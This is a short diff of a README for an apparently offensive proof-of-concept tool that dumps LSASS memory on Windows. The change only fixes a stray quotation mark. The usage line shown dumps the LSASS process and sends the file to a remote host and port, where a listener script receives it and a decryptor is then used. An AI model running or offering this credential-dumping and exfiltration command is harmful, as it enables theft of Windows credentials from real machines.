@@ -25,7 +25,7 @@ python3 serv.py <PORT>
 ```
 .\minidumppoc.exe <LSASS_PID> <WRITE_TO_FILE 0|1> <EXFIL 0|1> [<HOST> <PORT>] [<EXPORT_PATH>]
 
-    minidump.exe 696 1 1 '192.168.1.10' 1234" "c:\test.dmp"
+    minidump.exe 696 1 1 '192.168.1.10' 1234 "c:\test.dmp"
 ```
 
 Once the whole file is received, close the server, and use the dummy decryptor: 
